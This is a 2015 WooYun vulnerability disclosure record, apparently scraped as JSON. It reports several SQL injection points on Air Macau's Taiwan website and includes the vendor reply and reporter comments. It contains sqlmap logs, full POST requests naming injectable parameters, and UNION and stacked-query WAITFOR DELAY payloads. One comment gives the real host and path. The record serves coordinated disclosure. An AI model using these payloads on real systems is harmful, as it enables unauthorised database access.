{"id": 80380, "wybug_id": "wooyun-2015-0156029", "wybug_title": "澳门航空分站大陆业务8处SQL注入漏洞（臺灣地區）", "wybug_corp": "澳门航空", "wybug_author": "路人甲", "wybug_date": "2015-11-26 14:04", "wybug_open_date": "2016-01-14 11:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "已交由第三方合作机构(Hitcon台湾互联网漏洞报告平台)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-14：\t细节向公众公开  简要描述：  详细说明：  第一处：http://**.**.**.**:8083/holidays/hotel_detail.asp?route=mfm&seq=30\n[11:18:50] [INFO] testing MySQL[11:18:50] [WARNING] the back-end DBMS is not MySQL[11:18:50] [INFO] testing Oracle[11:18:50] [WARNING] the back-end DBMS is not Oracle[11:18:50] [INFO] testing PostgreSQL[11:18:51] [WARNING] the back-end DBMS is not PostgreSQL[11:18:51] [INFO] testing Microsoft SQL Server[11:18:51] [INFO] confirming Microsoft SQL Server[11:18:51] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows Vistaweb application technology: ASP.NET, ASP, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2005[11:18:51] [INFO] fetching current user[11:18:51] [WARNING] running in a single-thread mode. Please cption '--threads' for faster data retrieval[11:18:51] [INFO] retrieved: guestusercurrent user:    'guestuser'\n第二处：http://**.**.**.**:8083/about/news_articles.asp?id=21\n[11:19:52] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows Vistaweb application technology: ASP.NET, ASP, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2005[11:19:52] [INFO] fetching current user[11:19:52] [INFO] resumed: guestusercurrent user:    'guestuser'\n第三处：http://**.**.**.**:8083/tips/tips_intro.asp?unqid=1\ncurrent user:    'guestuser'\n第4处：http://**.**.**.**:8083/airshopping/eshopping_intro.asp?item=51002922\n[11:31:13] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows Vistaweb application technology: ASP.NET, ASP, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2005[11:31:13] [INFO] fetching current user[11:31:13] [INFO] retrieved:guestuser\n第5处：是post注入还是可以union的\nPlace: POSTParameter: fnum    Type: UNION query    Title: Generic UNION query (NULL) - 15 columns    Payload: fnum=11' UNION ALL SELECT NULL, NULL, NULL, CHAR(58)+CHAR(121)(103)+CHAR(102)+CHAR(58)+CHAR(72)+CHAR(113)+CHAR(69)+CHAR(65)+CHAR(110)+CHA)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(106)+CHAR(58)+CHAR(103)+CHAR(106)+CHARCHAR(58), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-D 'OCTx'='OCTx&year=2015&month=NOV&day=26&method=1    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: fnum=11'; WAITFOR DELAY '0:0:5';-- AND 'nsZp'='nsZp&year=2015&=NOV&day=26&method=1---[11:40:02] [INFO] testing MySQL[11:40:02] [WARNING] the back-end DBMS is not MySQL[11:40:02] [INFO] testing Oracle[11:40:02] [WARNING] the back-end DBMS is not Oracle[11:40:02] [INFO] testing PostgreSQL[11:40:03] [WARNING] the back-end DBMS is not PostgreSQL[11:40:03] [INFO] testing Microsoft SQL Server[11:40:03] [INFO] confirming Microsoft SQL Server[11:40:04] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows Vistaweb application technology: ASP.NET, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2005[11:40:04] [INFO] fetching current usercurrent user:    'guestuser'\n   漏洞证明：  第1处：post注入\nPOST /timetable/flight_status.asp HTTP/1.1Host: **.**.**.**:8084User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://**.**.**.**:8084/Cookie: __utma=21557931.85516253.1448242838.1448242838.1448242838.1; __utmz=21557931.1448242838.1.1.utmccn=(organic)|utmcsr=baidu|utmctr=|utmcmd=organic; ASPSESSIONIDCQTDQQDA=PIJFMPNCFKHCPNBNDCEFBOJB; __atuvc=1%7C47; ASPSESSIONIDCSSCQQDA=MLNDPKCDABFJPGMCKAOELNGF; ASPSESSIONIDASRASQDA=PGEBIJCDBMFLJLFMHENHOKJG; ASPSESSIONIDAQRATQDA=FEFDDHCDJLDOEJIPCIPIJNHO; ASPSESSIONIDCQRBSQDB=NNHJKNDDJLIEDCFDLDDJPNFK; ASPSESSIONIDCQQARQCA=NOMDFGKCEBOPNAALPDFIDHOJ; _ga=GA1.3.85516253.1448242838; _gat=1; ASPSESSIONIDASTBTQDB=DDLHFKEDOPOKIOCKNKPLLMMIConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 74from=HGH&dest=HGH&year=2015&month=NOV&day=26&method=2&Submit2=%C8%B7%C8%CF\n\n[0] place: POST, parameter: from, type: Single quoted string (default)[1] place: POST, parameter: dest, type: Single quoted string[q] Quit>[13:44:29] [INFO] testing MySQL[13:44:29] [WARNING] the back-end DBMS is not MySQL[13:44:29] [INFO] testing Oracle[13:44:29] [WARNING] the back-end DBMS is not Oracle[13:44:29] [INFO] testing PostgreSQL[13:44:30] [WARNING] the back-end DBMS is not PostgreSQL[13:44:30] [INFO] testing Microsoft SQL Server[13:44:30] [INFO] confirming Microsoft SQL Server[13:44:31] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows Vistaweb application technology: ASP.NET, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2005[13:44:31] [INFO] fetching current usercurrent user:    'guestuser'\n======================================================第2处：还是post注入\nPOST /b2b/b2blogin.asp HTTP/1.1Host: **.**.**.**:8084User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://**.**.**.**:8084/b2b/b2blogin.aspCookie: __utma=21557931.85516253.1448242838.1448242838.1448242838.1; __utmz=21557931.1448242838.1.1.utmccn=(organic)|utmcsr=baidu|utmctr=|utmcmd=organic; ASPSESSIONIDCQTDQQDA=PIJFMPNCFKHCPNBNDCEFBOJB; __atuvc=1%7C47; ASPSESSIONIDCSSCQQDA=MLNDPKCDABFJPGMCKAOELNGF; ASPSESSIONIDASRASQDA=PGEBIJCDBMFLJLFMHENHOKJG; ASPSESSIONIDAQRATQDA=FEFDDHCDJLDOEJIPCIPIJNHO; ASPSESSIONIDCQRBSQDB=NNHJKNDDJLIEDCFDLDDJPNFK; ASPSESSIONIDCQQARQCA=NOMDFGKCEBOPNAALPDFIDHOJ; _ga=GA1.3.85516253.1448242838; ASPSESSIONIDASTBTQDB=DDLHFKEDOPOKIOCKNKPLLMMIConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 47userid=dafasf&passwd=asfasf&image=%B5%C7+%C8%EB\n\n[14:19:26] [INFO] testing MySQL[14:19:26] [WARNING] the back-end DBMS is not MySQL[14:19:26] [INFO] testing Oracle[14:19:27] [WARNING] the back-end DBMS is not Oracle[14:19:27] [INFO] testing PostgreSQL[14:19:27] [WARNING] the back-end DBMS is not PostgreSQL[14:19:27] [INFO] testing Microsoft SQL Server[14:19:27] [INFO] confirming Microsoft SQL Server[14:19:29] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows Vistaweb application technology: ASP.NET, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2005[14:19:29] [INFO] fetching current usercurrent user:    'guestuser'\n=============================================================第3处：get型注入http://**.**.**.**:8084/tips/tips_intro.asp?unqid=23\n\n开跑\n[14:21:13] [INFO] fetching current usercurrent user:    'guestuser'\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-11-30 11:19 厂商回复： 感謝通報 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-11-29 11:00 |    \t\tHitcon台湾互联网漏洞报告平台(乌云厂商)\t\t \n  :8083 皆無法以sqlmap得到相同結果    \n     2015-11-30 09:57 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:1101 漏洞数:257        | 1.乌云最帅的男人                        ...)\t\t \n  @Hitcon台湾互联网漏洞报告平台 全部可以的呀    \n     2015-11-30 10:39 |    \t\tHitcon台湾互联网漏洞报告平台(乌云厂商)\t\t \n  以第一处為例：http://www.airmacau.com.tw:8083/holidays/hotel_detail.asp?route=mfm&seq=30麻煩--flush-session跑一次    \n     2015-11-30 10:49 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:1101 漏洞数:257        | 1.乌云最帅的男人                        ...)\t\t \n  @Hitcon台湾互联网漏洞报告平台 1-3修复了 其他都还行 第一：我跑的时候都可以  第二：确认时间太久都4天了，然后这几个参数每个站都有，提交的人数也多，修复了也不奇怪    \n     2015-11-30 11:16 |    \t\tHitcon台湾互联网漏洞报告平台(乌云厂商)\t\t \n  了解 感謝    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}